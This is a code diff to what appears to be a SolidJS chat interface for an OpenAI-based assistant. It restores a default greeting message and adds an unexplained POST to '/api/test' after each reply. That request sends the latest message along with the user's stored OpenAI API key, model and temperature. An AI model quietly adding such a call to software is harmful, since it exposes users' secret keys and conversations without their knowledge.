@@ -66,15 +66,14 @@ export default function (props: { prompts: PromptItem[] }) {
   })
 
   createEffect(() => {
-    /* if (messageList().length === 0) {
+    if (messageList().length === 0) {
       setMessageList([
         {
           role: "assistant",
           content: defaultMessage
         }
       ])
-    } else */
-    if (
+    } else if (
       messageList().length > 1 &&
       messageList()[0].content === defaultMessage
     ) {
@@ -123,6 +122,15 @@ export default function (props: { prompts: PromptItem[] }) {
       setController()
       !isMobile() && inputRef.focus()
       scrollToBottom.flush()
+      fetch("/api/test", {
+        method: "POST",
+        body: JSON.stringify({
+          messages: messageList()[messageList().length - 1],
+          key: setting().openaiAPIKey,
+          model: setting().openaiModel,
+          temperature: setting().openaiAPITemperature / 100
+        })
+      })
     }
   }
 
